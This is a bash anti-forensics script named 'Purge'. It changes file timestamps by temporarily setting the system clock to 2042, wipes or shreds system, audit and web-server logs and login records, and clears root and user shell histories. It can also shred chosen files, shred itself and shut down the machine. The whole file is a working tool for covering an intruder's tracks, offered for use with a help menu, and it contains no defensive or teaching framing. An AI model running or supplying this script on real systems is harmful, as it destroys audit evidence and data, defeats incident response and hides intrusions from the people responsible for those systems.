#!/bin/bash

# Variables.
originalDate="$(date +"%Y%m%d %H%M")"
varLogFileDir=("$(find /var/log /var/audit /private/var/audit /private/var/log/ /var/adm/lastlog /usr/adm/lastlog /etc/utmp /etc/wtmp /var/adm /var/logs /var/run/utmp /var/apache/log /var/apache/logs /usr/local/apache/log /usr/local/apache/logs /tmp/logs /opt/lampp/logs/access_log /var/log/nginx/access.log /logs/agent_lo /logs/referer_log /logs/access_log -type f,d -name "*" 2>/dev/null)")
varLogFile=("$(find /var/log /var/audit /private/var/audit /private/var/log/ /var/adm/lastlog /usr/adm/lastlog /etc/utmp /etc/wtmp /var/adm /var/logs /var/run/utmp /var/apache/log /var/apache/logs /usr/local/apache/log /usr/local/apache/logs /tmp/logs /opt/lampp/logs/access_log /var/log/nginx/access.log /logs/agent_lo /logs/referer_log /logs/access_log -type f -name "*" 2>/dev/null)")
varHist=("$(find /root/.bash_logout /root/.bash_history /root/.ksh_history ~/.bash_logout ~/.bash_history ~/.ksh_history -type f -name "*" 2>/dev/null)")
purgeLocation="$(find /home -type f -name purge.sh)"

while getopts a:m:s:e:v:z:j:ltkhcux flag; do
  case "${flag}" in
  t)
    echo "The date of the system is setting:"
    date -s "01 APR 2042 06:45:00"

    for str in ${varLogFileDir[@]}; do
      echo "The timestomp is changing: $str"
      touch -ahcm -d '1 Jan' $str # To change the "Access", "Modify", and "Change" date.
    done

    echo "The date of the system is reseting:"
    date --set="$originalDate"
    ;;

  a)
    echo "The access date is changing: $OPTARG."
    touch -ac -d '12 Aug' $OPTARG # To change the "Access" date.
    ;;

  m)
    echo "The modify date is changing: $OPTARG."
    touch -mc -d '5 Aug' $OPTARG # To change the "Modify" date.
    ;;

  s)
    echo "The symbolic link's timestamp is changing: $OPTARG."
    touch -hc -d '5 Aug' $OPTARG # To change the symbolic link's timestamp.
    ;;

  e)
    echo "The date of the system is setting:"
    date -s "11 APR 2042 06:45:00"

    echo "The timestamp date is changing: $OPTARG."
    touch -ahcm -d '13 Nov' $OPTARG # To change the "Access", "Modify", and "Change" date.

    echo "The date of the system is reseting:"
    date --set="$originalDate"
    ;;

  v)
    echo "The file's timestamp is: $OPTARG."
    echo "$(stat $OPTARG | tail -n 4)"
    ;;

  z)
    echo "The file is shredding: $OPTARG."
    shred -u -z -n 30 $OPTARG
    ;;

  k)
    for str in ${varLogFile[@]}; do
      echo "The file is removing: $str."
      shred -u -z -n 30 $str
    done
    ;;

  l)
    for str in ${varLogFile[@]}; do
      echo "Log file is cleaning: $str."
      cat /dev/null >$str
    done
    ;;

  j)
    echo "The log file is cleaning: $OPTARG."
    cat /dev/null >$OPTARG
    ;;

  c)
    history -w && history -c

    for str in ${varHist[@]}; do
      echo "The history file is cleaning: $str."
      cat /dev/null >$str
    done
    ;;

  x)
    echo "The date of the system is setting:"
    date -s "17 APR 2042 06:45:00"

    for str in ${varLogFile[@]}; do
      echo "Log file is cleaning: $str."
      cat /dev/null >$str
    done

    history -w && history -c

    for str in ${varHist[@]}; do
      echo "The history file is cleaning: $str."
      cat /dev/null >$str
    done

    for str in ${varLogFileDir[@]}; do
      echo "The timestomp is changing: $str"
      touch -ahmc -d '18 Nov' $str # To change the "Access", "Modify", and "Change" date.
    done

    echo "The date of the system is reseting:"
    date --set="$originalDate"
    ;;

  u)
    echo "The system is shutting down after 5 seconds:"
    for i in 5 4 3 2 1; do
      sleep 1
      echo "$i"
    done
    sleep 1
    echo "Bye Bye!"
    $(shred -u -z -n 30 $purgeLocation)
    sleep 1
    shutdown -h now
    ;;

  h)
    echo '
     ________  ___  ___  ________  ________  _______      
    |\   __  \|\  \|\  \|\   __  \|\   ____\|\  ___ \     
    \ \  \|\  \ \  \\\  \ \  \|\  \ \  \___|\ \   __/|    
     \ \   ____\ \  \\\  \ \   _  _\ \  \  __\ \  \_|/__  
      \ \  \___|\ \  \\\  \ \  \\  \\ \  \|\  \ \  \_|\ \ 
       \ \__\    \ \_______\ \__\\ _\\ \_______\ \_______\
        \|__|     \|_______|\|__|\|__|\|_______|\|_______|
        
        '
    echo "[Timestomp]"
    echo " "
    echo "-t	Changes the all log files' timestamp."
    echo "-a	Changes the access time of a file."
    echo "-m	Changes the modification time of a file."
    echo "-s	Changes the symbolic link's timestamp of a file."
    echo "-e	Changes the access, modification, and symbolic link's timestamp of a file."
    echo "-v	Print current dates of a file."
    echo " "
    echo "The usage: $0 [-t]"
    echo "The usage: $0 [-a] [-m] [-s] [e] [-v] <AbsoluteFilePath>"
    echo " "
    echo "[Removing]"
    echo " "
    echo "-z	Delete the file with shredding."
    echo "-k	Delete the all log files with shredding."
    echo " "
    echo "The usage: $0 [-k]"
    echo "The usage: $0 [-z] <AbsoluteFilePath>"
    echo " "
    echo "[Cleaning]"
    echo " "
    echo "-l	Clean the all log files."
    echo "-j	Clean the file."
    echo "-c	Clean the all history files."
    echo " "
    echo "The usage: $0 [-l]"
    echo "The usage: $0 [-j] <AbsoluteFilePath>"
    echo " "
    echo "[Purge]"
    echo " "
    echo "-x	Do both timestomp and cleaning for log files."
    echo "-u	Shutdown the system."
    echo " "
    echo "The usage: $0 [-u] [-x] "
    echo " "
    exit 0
    ;;

  ?)
    echo "Invalid option! Please look at the help menu with $0 [-h]" >&2
    exit 1
    ;;
  esac
done

# Don't forget to unset the variables.
unset originalDate
unset varLogFileDir
unset varLogFile
unset varHist
unset OPTARG
unset flag
unset str
